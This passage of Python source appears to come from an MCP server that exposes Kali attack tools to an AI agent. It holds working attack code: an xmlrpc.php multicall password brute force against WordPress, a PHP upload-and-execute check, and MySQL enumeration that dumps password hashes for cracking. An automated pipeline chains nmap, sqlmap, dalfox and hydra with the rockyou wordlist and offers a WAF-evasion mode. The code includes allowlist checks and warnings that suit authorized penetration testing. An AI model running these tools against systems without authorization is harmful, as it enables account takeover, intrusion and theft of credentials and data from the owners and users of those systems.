    xmlrpc_url = target_url.rstrip("/") + "/xmlrpc.php"
    results: dict[str, Any] = {"target": target_url, "xmlrpc_url": xmlrpc_url, "phases": {}}

    # 1. Check existence
    check = _exec_in_kali(
        ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", xmlrpc_url],
        tool_name="curl", target=target_url,
    )
    http_code = check.output.strip()
    results["phases"]["existence"] = {"http_code": http_code, "accessible": http_code in ("200", "405")}

    if http_code not in ("200", "405"):
        results["accessible"] = False
        results["summary"]    = f"xmlrpc.php not accessible (HTTP {http_code})."
        return results

    results["accessible"] = True

    # 2. Enumerate available methods
    list_methods_xml = (
        "<?xml version='1.0'?>"
        "<methodCall><methodName>system.listMethods</methodName><params/></methodCall>"
    )
    methods = _exec_in_kali(
        ["curl", "-s", "-X", "POST", "-H", "Content-Type: text/xml", "-d", list_methods_xml, xmlrpc_url],
        tool_name="curl", target=target_url,
    )
    results["phases"]["list_methods"] = {"output": methods.output[:3000]}

    # 3. Multicall brute force with common credentials (3 attempts)
    multicall_xml = (
        "<?xml version='1.0'?><methodCall><methodName>system.multicall</methodName>"
        "<params><param><value><array><data>"
        "<value><struct>"
        "<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>"
        "<member><name>params</name><value><array><data>"
        "<value><string>admin</string></value><value><string>admin</string></value>"
        "</data></array></value></member></struct></value>"
        "<value><struct>"
        "<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>"
        "<member><name>params</name><value><array><data>"
        "<value><string>admin</string></value><value><string>password123</string></value>"
        "</data></array></value></member></struct></value>"
        "<value><struct>"
        "<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>"
        "<member><name>params</name><value><array><data>"
        "<value><string>admin</string></value><value><string>123456</string></value>"
        "</data></array></value></member></struct></value>"
        "</data></array></value></param></params></methodCall>"
    )
    multicall = _exec_in_kali(
        ["curl", "-s", "-X", "POST", "-H", "Content-Type: text/xml", "-d", multicall_xml, xmlrpc_url],
        tool_name="curl", target=target_url,
    )
    results["phases"]["multicall"] = {"output": multicall.output[:3000]}

    auth_ok = any(k in multicall.output for k in ("isAdmin", "blogName", "blogid"))
    results["auth_bypass_found"] = auth_ok
    results["summary"] = (
        "CRITICAL: Valid credentials confirmed via xmlrpc multicall!" if auth_ok
        else "xmlrpc.php exposed. Methods enumerated. None of the 3 test credentials confirmed a login."
    )
    return results


@mcp.tool()
def test_file_upload(
    upload_url: str,
    field_name: str = "file",
    upload_path_hint: str = "/wp-content/uploads/",
) -> dict[str, Any]:
    """
    Checks for an unrestricted file upload vulnerability (CWE-434).
    Sends a harmless proof-of-concept PHP file and checks whether it executes.

    WARNING: creates a PHP file with no destructive commands on the test server.
    Use only in authorized environments.

    Args:
        upload_url:       Upload endpoint URL.
                          E.g.: "http://192.168.1.10/wp-content/plugins/vuln-plugin/upload.php"
        field_name:       Name of the <input type="file"> field in the form. Default: "file"
        upload_path_hint: Base path where the server stores uploads.
                          E.g.: "/wp-content/uploads/", "/uploads/", "/files/"
    """
    if not _is_allowed(upload_url):
        return {
            "success": False,
            "error": f"Target '{upload_url}' is not in the allowlist. Use manage_allowlist() first.",
        }

    test_id  = uuid.uuid4().hex[:8]
    filename = f"test_{test_id}.php"

    try:
        container = _get_container()
        container.exec_run([
            "sh", "-c",
            f"printf '%s' '<?php echo \"UPLOAD_CONFIRMED_{test_id}_\".phpversion(); ?>' > /tmp/{filename}",
        ])
    except RuntimeError as exc:
        return {"success": False, "error": str(exc)}

    results: dict[str, Any] = {
        "upload_url": upload_url,
        "test_file":  filename,
        "test_id":    test_id,
        "phases":     {},
    }

    # Upload the test PHP file
    upload_result = _exec_in_kali(
        ["curl", "-s", "-i", "-F", f"{field_name}=@/tmp/{filename}", upload_url],
        tool_name="curl", target=upload_url,
    )
    results["phases"]["upload"] = upload_result.model_dump()

    # Try to extract the file URL from the response; otherwise build a likely URL
    base_url     = "/".join(upload_url.split("/")[:3])
    uploaded_url = None
    for token in upload_result.output.split():
        tok = token.strip('"\'<>\n\r')
        if filename in tok or test_id in tok:
            uploaded_url = tok
            break
    if not uploaded_url:
        uploaded_url = base_url + upload_path_hint + filename

    results["likely_url"] = uploaded_url

    # Check whether the file is accessible and whether PHP executed
    access_result = _exec_in_kali(
        ["curl", "-s", "-L", "--max-time", "10", uploaded_url],
        tool_name="curl", target=uploaded_url,
    )
    results["phases"]["access"] = access_result.model_dump()

    marker     = f"UPLOAD_CONFIRMED_{test_id}_"
    executed   = marker in access_result.output
    accessible = access_result.exit_code == 0 and bool(access_result.output.strip())

    results["file_accessible"] = accessible
    results["php_executed"]    = executed

    if executed:
        php_ver = access_result.output.split(marker)[-1].strip()
        results["php_version"] = php_ver
        results["severity"]    = "critical"
        results["summary"]     = (
            f"CRITICAL: PHP upload and execution confirmed! "
            f"PHP {php_ver} running on the server. RCE possible via webshell."
        )
    elif accessible:
        results["severity"] = "high"
        results["summary"]  = (
            f"HIGH: File uploaded and accessible at {uploaded_url} "
            "but PHP did not execute (may be blocked in the uploads directory)."
        )
    else:
        results["severity"] = "medium"
        results["summary"]  = (
            "Upload sent but the file is not accessible at the expected path. "
            f"Check the upload response and adjust upload_path_hint. Tried: {uploaded_url}"
        )
    return results


@mcp.tool()
def enumerate_mysql_database(
    host: str,
    port: int = 3306,
    user: str = "root",
    password: str = "root",
    database: str = "",
) -> dict[str, Any]:
    """
    Connects directly to MySQL and enumerates databases, tables, users, and
    password hashes.
    Use when Nmap identifies an exposed port 3306 with weak credentials.

    For WordPress: pass database="wordpress" to extract hashes from the wp_users
    table and crack them offline with hashcat (phpass format).

    WARNING: direct database access — use only in authorized environments.

    Args:
        host:     IP or hostname of the MySQL server. E.g.: "192.168.1.10", "vulnwp-db"
        port:     MySQL port. Default: 3306
        user:     Username. E.g.: "root", "wordpress"
        password: Password. E.g.: "root", "wordpress"
        database: Specific database to list tables for. E.g.: "wordpress"
    """
    if database and not re.match(r"^[a-zA-Z0-9_\-]+$", database):
        return {"success": False, "error": "database contains invalid characters."}

    mysql_base = [
        "mysql",
        "-h", host,
        "-P", str(port),
        "-u", user,
        f"-p{password}",
        "--connect-timeout", "10",
        "-e",
    ]

    results: dict[str, Any] = {
        "host": host, "port": port, "user": user,
        "phases": {}, "connected": False,
    }

    # 1. List databases
    db_result = _exec_in_kali(
        mysql_base + ["SHOW DATABASES;"],
        tool_name="mysql", target=host,
    )
    results["phases"]["databases"]  = db_result.model_dump()
    results["connected"]            = db_result.success

    if not db_result.success:
        results["summary"] = f"Connection failed: {db_result.error or db_result.output}"
        return results

    # 2. Users and password hashes
    users_result = _exec_in_kali(
        mysql_base + ["SELECT user, host, authentication_string FROM mysql.user;"],
        tool_name="mysql", target=host,
    )
    results["phases"]["users_hashes"] = users_result.model_dump()

    # 3. Tables in the specified database
    if database:
        tables_result = _exec_in_kali(
            mysql_base + [f"USE `{database}`; SHOW TABLES;"],
            tool_name="mysql", target=host,
        )
        results["phases"]["tables"] = tables_result.model_dump()

        # 4. wp_users if WordPress
        if "wp_users" in tables_result.output:
            wp_users = _exec_in_kali(
                mysql_base + [
                    f"USE `{database}`; "
                    "SELECT user_login, user_pass, user_email, user_registered FROM wp_users LIMIT 20;"
                ],
                tool_name="mysql", target=host,
            )
            results["phases"]["wp_users"]           = wp_users.model_dump()
            results["wordpress_hashes_found"]        = "user_pass" in wp_users.output

    results["summary"] = (
        f"Successfully connected as {user}@{host}:{port}. "
        "See 'phases' for databases, users, and hashes."
    )
    return results


@mcp.tool()
def resume_session(target: str) -> dict[str, Any]:
    """
    Lists all scans saved to disk for a target, allowing you to resume an
    interrupted pentest without losing previous progress.

    Outputs are automatically saved to ~/mcps/outputs/kali-mcp/<target>/ on every scan.

    Args:
        target: Domain or IP of the target. E.g.: "example.com", "192.168.1.10"
    """
    out_dir = _target_output_dir(target)
    session_path = out_dir / "session.json"

    if not session_path.exists():
        files = sorted(out_dir.glob("*.txt"))
        if not files:
            return {"success": False, "error": f"No output found for '{target}' in {out_dir}"}
        return {
            "success":   True,
            "output_dir": str(out_dir),
            "files":     [f.name for f in files],
            "session":   None,
        }

    session = json.loads(session_path.read_text(encoding="utf-8"))
    scans   = session.get("scans", [])
    tools_done = [s["tool"] for s in scans]

    # Read previews of the latest outputs per tool
    previews: dict[str, str] = {}
    for scan in reversed(scans):
        tool = scan["tool"]
        if tool not in previews:
            fpath = out_dir / scan["file"]
            if fpath.exists():
                content = fpath.read_text(encoding="utf-8", errors="replace")
                previews[tool] = content[:1500]

    return {
        "success":     True,
        "output_dir":  str(out_dir),
        "target":      session.get("target"),
        "started":     session.get("started"),
        "last_updated": session.get("last_updated"),
        "total_scans": len(scans),
        "tools_executed": sorted(set(tools_done)),
        "scans":       scans,
        "previews":    previews,
    }


@mcp.tool()
def list_findings(target: str = "", limit: int = 50) -> dict[str, Any]:
    """
    Lists findings stored in the database, optionally filtered by target.

    Args:
        target: Partial target filter. Empty = all.
        limit:  Maximum number of results. Default: 50
    """
    with sqlite3.connect(DB_PATH) as conn:
        if target:
            rows = conn.execute(
                "SELECT id, tool, target, timestamp, exit_code, success, error "
                "FROM findings WHERE target LIKE ? ORDER BY timestamp DESC LIMIT ?",
                (f"%{target}%", limit),
            ).fetchall()
        else:
            rows = conn.execute(
                "SELECT id, tool, target, timestamp, exit_code, success, error "
                "FROM findings ORDER BY timestamp DESC LIMIT ?",
                (limit,),
            ).fetchall()

    return {
        "total": len(rows),
        "findings": [
            {
                "id": r[0], "tool": r[1], "target": r[2], "timestamp": r[3],
                "exit_code": r[4], "success": bool(r[5]), "error": r[6],
            }
            for r in rows
        ],
    }


@mcp.tool()
def generate_report(target: str, output_format: str = "markdown") -> dict[str, Any]:
    """
    Generates a consolidated report of all findings for a target.
    File saved to ~/.kali-mcp/workspaces/<target>_<timestamp>.<ext>

    Args:
        target:        Target to consolidate. E.g.: "192.168.1.10", "app.local"
        output_format: "markdown" (default) or "json"
    """
    with sqlite3.connect(DB_PATH) as conn:
        rows = conn.execute(
            "SELECT tool, target, timestamp, exit_code, success, output, error "
            "FROM findings WHERE target LIKE ? ORDER BY timestamp ASC",
            (f"%{target}%",),
        ).fetchall()

    if not rows:
        return {"success": False, "error": f"No findings found for '{target}'"}

    findings = [
        {
            "tool": r[0], "target": r[1], "timestamp": r[2],
            "exit_code": r[3], "success": bool(r[4]), "output": r[5], "error": r[6],
        }
        for r in rows
    ]

    now         = datetime.now()
    ts          = now.strftime("%Y%m%d_%H%M%S")
    safe_target = target.replace("/", "_").replace(":", "_").replace(".", "_")
    tools_used  = sorted({f["tool"] for f in findings})

    if output_format == "json":
        content = json.dumps(
            {"target": target, "generated": now.isoformat(), "findings": findings},
            indent=2, ensure_ascii=False,
        )
        ext = "json"
    else:
        total   = len(findings)
        success = sum(1 for f in findings if f["success"])
        lines   = [
            f"# Security Report — {target} — {now.strftime('%Y-%m-%d %H:%M')}",
            "",
            "## Scope Tested",
            f"- **Target:** `{target}`",
            f"- **Tools executed:** {', '.join(tools_used)}",
            f"- **Total scans:** {total}  |  **Successful:** {success}  |  **Failed:** {total - success}",
            f"- **Generated at:** {now.isoformat()}",
            "",
            "---",
            "",
            "## Findings by Tool",
            "",
        ]
        for f in findings:
            status = "OK" if f["success"] else "FAILED"
            lines += [
                f"### [{status}] {f['tool'].upper()} — {f['timestamp']}",
                f"**Target:** `{f['target']}`  |  **Exit code:** `{f['exit_code']}`",
                "",
            ]
            if f["error"]:
                lines += [f"> **Error:** {f['error']}", ""]
            if f["output"]:
                preview = f["output"][:5000]
                truncated = " *(truncated — see the full file)*" if len(f["output"]) > 5000 else ""
                lines += [f"```\n{preview}\n```{truncated}", ""]
            lines += ["---", ""]

        lines += [
            "## Execution Summary",
            "| Tool | Status | Timestamp |",
            "|---|---|---|",
        ]
        for f in findings:
            lines.append(f"| {f['tool']} | {'✓' if f['success'] else '✗'} | {f['timestamp']} |")

        content = "\n".join(lines)
        ext = "md"

    output_path = WORKSPACE_DIR / f"{safe_target}_{ts}.{ext}"
    output_path.write_text(content, encoding="utf-8")

    return {
        "success":        True,
        "target":         target,
        "findings_count": len(findings),
        "output_file":    str(output_path),
        "output_format":  output_format,
        "preview":        content[:3000],
    }


@mcp.tool()
def run_full_pentest(
    target: str,
    target_url: str = "",
    include_brute_force: bool = False,
    evasion: bool = False,
) -> dict[str, Any]:
    """
    Runs the full pentest pipeline autonomously in the correct order.

    Pipeline executed:
      1.  Ping                      — checks whether the target is online
      2.  Nmap                      — port and service reconnaissance
      3.  Subfinder                 — subdomain enumeration (if a domain)
      4.  Gobuster                  — hidden directory/file enumeration
      5.  Exposed files             — checks .env, backups, phpinfo, etc.
      6.  Nikto                     — web vulnerability analysis
      7.  Security headers          — CSP, X-Frame-Options, HSTS, cookies
      8.  Nuclei                    — CVE detection (+ wordpress tags if detected)
      9.  WPScan                    — deep WordPress audit (if detected)
      10. xmlrpc.php                — xmlrpc brute force and enumeration (if WordPress)
      11. Testssl                   — SSL/TLS analysis (HTTPS only)
      12. Katana                    — crawling with XHR and parameter discovery
      13. Dalfox                    — XSS on discovered parameters
      14. SQLMap                    — SQL Injection on discovered parameters
      15. Hydra                     — SSH/FTP brute force (only if include_brute_force=True)
      16. Report                    — automatic Markdown consolidation

    WARNING: can take 25-60 minutes depending on the target and exposed surface.

    Args:
        target:               IP or hostname of the target. E.g.: "192.168.1.10", "app.local"
        target_url:           Base URL (inferred from Nmap if omitted).
        include_brute_force:  Include Hydra in the pipeline. Requires explicit authorization.
        evasion:              True = slow scans with a real UA to avoid WAF/rate-limiting.
                              Recommended for external targets (production, shared hosting).
    """
    results: dict[str, Any] = {
        "target":    target,
        "started":   datetime.now().isoformat(),
        "evasion":   evasion,
        "phases":    {},
        "warnings":  [],
    }

    # ── Evasion parameters used in inline commands ──
    _gb_threads  = ["5"] if evasion else ["20"]
    _gb_delay    = ["--delay", "300ms"] if evasion else []
    _gb_ua       = ["-a", _STEALTH_UA] if evasion else []
    _nmap_delay  = ["--scan-delay", "1s", "-T2"] if evasion else []
    _nuclei_rate = "10" if evasion else "20"
    _katana_rate = ["-rate-limit", "5"] if evasion else []

    # ── 1. Ping ──
    ping = _exec_in_kali(["ping", "-c", "3", "-W", "2", target], "ping", target)
    results["phases"]["ping"] = ping.model_dump()
    if not ping.success:
        results["warnings"].append("Target did not respond to ping — it may be offline or blocking ICMP. Continuing anyway.")

    # ── 2. Nmap ──
    nmap = _exec_in_kali(
        ["nmap", "-sV", "-F", "--open"] + _nmap_delay + [target],
        "nmap", target,
    )
    results["phases"]["nmap"] = nmap.model_dump()

    # Detect web, SSH, and FTP ports in the output
    web_ports: list[int] = []
    has_ssh = has_ftp = False
    for line in nmap.output.splitlines():
        low = line.lower()
        if "open" not in low:
            continue
        for p in [80, 443, 8080, 8443, 3000, 4000, 5000, 8000, 9090, 8888]:
            if f"{p}/tcp" in line:
                web_ports.append(p)
        if "22/tcp" in line:
            has_ssh = True
        if "21/tcp" in line:
            has_ftp = True

    # Infer base URL if not provided
    if not target_url and web_ports:
        proto = "https" if (443 in web_ports or 8443 in web_ports) else "http"
        port  = web_ports[0]
        target_url = (
            f"{proto}://{target}" if port in (80, 443)
            else f"{proto}://{target}:{port}"
        )

    results["web_ports_found"]  = web_ports
    results["target_url_used"]  = target_url
    results["has_ssh"]          = has_ssh
    results["has_ftp"]          = has_ftp

    # ── 3. Subfinder (domains only) ──
    if not target.replace(".", "").isdigit():
        sub = _exec_in_kali(["subfinder", "-d", target, "-silent"], "subfinder", target)
        results["phases"]["subfinder"] = sub.model_dump()

    # ── Web phases (only if a URL is available) ──
    if target_url:
        is_https = target_url.startswith("https")

        # ── 4. Gobuster ──
        gobuster = _exec_in_kali(
            [
                "gobuster", "dir",
                "-u", target_url,
                "-w", "/usr/share/wordlists/dirb/common.txt",
                "-x", "php,html,js,txt,bak,env",
                "-t", *_gb_threads, *_gb_delay, *_gb_ua,
                "-q", "--no-error", "--timeout", "15s",
            ],
            "gobuster", target_url,
        )
        results["phases"]["gobuster"] = gobuster.model_dump()

        # Detect WordPress from Gobuster + Nmap output
        is_wordpress = any(
            kw in gobuster.output.lower() or kw in nmap.output.lower()
            for kw in ("wp-login", "wp-content", "wp-admin", "wordpress")
        )
        results["is_wordpress"] = is_wordpress

        # ── 5. Exposed sensitive files ──
        exposed = _exec_in_kali(
            [
                "gobuster", "dir",
                "-u", target_url,
                "-w", "/usr/share/wordlists/sensitive-paths.txt",
                "-t", *(["3"] if evasion else ["10"]),
                *_gb_delay, *_gb_ua,
                "-q", "--no-error", "--timeout", "15s",
            ],
            "gobuster", target_url,
        )
        results["phases"]["exposed_files"] = exposed.model_dump()

        # ── 6. Nikto ──
        nikto = _exec_in_kali(
            ["nikto", "-h", target_url, "-nointeractive", "-maxtime", "120s"],
            "nikto", target_url,
        )
        results["phases"]["nikto"] = nikto.model_dump()

        # ── 7. Security headers ──
        headers_cmd = ["curl", "-s", "-I", "-L", "--max-time", "10", target_url]
        headers_raw = _exec_in_kali(headers_cmd, "curl", target_url)
        _parsed_headers: dict[str, str] = {}
        for _line in headers_raw.output.splitlines():
            if ":" in _line and not _line.lower().startswith("http/"):
                _k, _, _v = _line.partition(":")
                _parsed_headers[_k.strip().lower()] = _v.strip()
        _EXPECTED = {
            "content-security-policy": "high", "x-frame-options": "medium",
            "x-content-type-options": "medium", "strict-transport-security": "high",
        }
        _header_findings = [
            {"header": h, "status": "present" if _parsed_headers.get(h) else "missing",
             "severity": "info" if _parsed_headers.get(h) else sev}
            for h, sev in _EXPECTED.items()
        ]
        results["phases"]["security_headers"] = {
            "tool": "curl-headers", "target": target_url,
            "exit_code": headers_raw.exit_code, "success": headers_raw.success,
            "findings": _header_findings,
            "raw": headers_raw.output[:2000],
        }

        # ── 8. Nuclei (with wordpress tags if detected) ──
        nuclei_cmd = [
            "nuclei", "-u", target_url,
            "-severity", "medium,high,critical",
            "-silent", "-no-color", "-timeout", "10",
            "-rate-limit", _nuclei_rate,
            "-H", f"User-Agent: {_STEALTH_UA}",
        ]
        if is_wordpress:
            nuclei_cmd += ["-tags", "wordpress"]
        nuclei = _exec_in_kali(nuclei_cmd, "nuclei", target_url)
        results["phases"]["nuclei"] = nuclei.model_dump()

        # ── 9. WPScan (only if WordPress detected) ──
        if is_wordpress:
            wpscan = _exec_in_kali(
                [
                    "wpscan",
                    "--url", target_url,
                    "--no-banner", "--no-update",
                    "--disable-tls-checks",
                    "--format", "cli-no-colour",
                    "--enumerate", "vp,vt,u",
                    "--plugins-detection", "passive",
                ],
                "wpscan", target_url,
            )
            results["phases"]["wpscan"] = wpscan.model_dump()

            # ── 10. xmlrpc (if WordPress) ──
            xmlrpc_url = target_url.rstrip("/") + "/xmlrpc.php"
            xmlrpc_check = _exec_in_kali(
                ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", xmlrpc_url],
                "curl", target_url,
            )
            if xmlrpc_check.output.strip() in ("200", "405"):
                xmlrpc_result = scan_xmlrpc_wordpress(target_url)
                results["phases"]["xmlrpc"] = xmlrpc_result
            else:
                results["phases"]["xmlrpc"] = {"accessible": False, "http_code": xmlrpc_check.output.strip()}

        # ── 11. Testssl (HTTPS only) ──
        if is_https:
            host_port = target_url.replace("https://", "")
            if ":" not in host_port:
                host_port = f"{host_port}:443"
            testssl = _exec_in_kali(
                ["testssl.sh", "--quiet", "--color", "0", "--fast", host_port],
                "testssl", target,
            )
            results["phases"]["testssl"] = testssl.model_dump()

        # ── 12. Katana (crawling with XHR) ──
        katana = _exec_in_kali(
            [
                "katana", "-u", target_url,
                "-d", "3", "-silent", "-jc", "-xhr",
                "-kf", "all", "-timeout", "30", "-retry", "2",
                *_katana_rate,
            ],
            "katana", target_url,
        )
        results["phases"]["katana"] = katana.model_dump()

        # Extract URLs with parameters from the Katana output
        param_urls = [
            line.strip()
            for line in katana.output.splitlines()
            if "?" in line and "=" in line
        ]
        results["param_urls_found"] = param_urls

        # ── 13 + 14. Dalfox and SQLMap (on discovered parameters) ──
        if param_urls:
            test_url = param_urls[0]

            dalfox = _exec_in_kali(
                ["dalfox", "url", test_url, "--no-color", "--silence", "--timeout", "30", "--worker", "10"],
                "dalfox", test_url,
            )
            results["phases"]["dalfox"] = dalfox.model_dump()

            sqlmap = _exec_in_kali(
                [
                    "sqlmap", "-u", test_url,
                    "--batch", "--random-agent",
                    "--risk=1", "--level=1",
                    "--output-dir=/tmp/sqlmap-results",
                ],
                "sqlmap", test_url,
            )
            results["phases"]["sqlmap"] = sqlmap.model_dump()
        else:
            results["warnings"].append(
                "Katana found no URLs with parameters — Dalfox and SQLMap skipped. "
                "Run them manually if you identify endpoints by hand."
            )

    else:
        results["warnings"].append(
            "No web port identified by Nmap — web phases skipped. "
            "If the target has a web service on a non-standard port, pass target_url manually."
        )

    # ── 15. Hydra (optional) ──
    if include_brute_force:
        if has_ssh:
            hydra_ssh = _exec_in_kali(
                [
                    "hydra",
                    "-L", "/usr/share/wordlists/unix_users.txt",
                    "-P", "/usr/share/wordlists/rockyou.txt",
                    "-s", "22", "-t", "4", "-f", "-q",
                    target, "ssh",
                ],
                "hydra", target,
            )
            results["phases"]["hydra_ssh"] = hydra_ssh.model_dump()

        if has_ftp:
            hydra_ftp = _exec_in_kali(
                [
                    "hydra",
                    "-L", "/usr/share/wordlists/unix_users.txt",
                    "-P", "/usr/share/wordlists/rockyou.txt",
                    "-s", "21", "-t", "4", "-f", "-q",
                    target, "ftp",
                ],
                "hydra", target,
            )
            results["phases"]["hydra_ftp"] = hydra_ftp.model_dump()

    # ── 16. Report ──
    report = generate_report(target, output_format="markdown")
    results["report"]    = report
    results["finished"]  = datetime.now().isoformat()
    results["phases_run"] = list(results["phases"].keys())

    return results


# ── Entrypoint ───────────────────────────────────────────────────────────────

if __name__ == "__main__":
    if os.environ.get("KALI_MCP_TRANSPORT", "stdio").lower() == "http":
        # Remote mode: intended for access via Tailscale. Never bind
        # to 0.0.0.0 here — that would expose offensive tools (hydra,
        # sqlmap, malicious PHP upload, etc.) to any local network.
        host = os.environ.get("KALI_MCP_HOST", "127.0.0.1")
        port = int(os.environ.get("KALI_MCP_PORT", "8765"))
        logging.info(f"Kali MCP Bridge (HTTP) at http://{host}:{port}/mcp")
        mcp.run(transport="http", host=host, port=port)
    else:
        mcp.run()
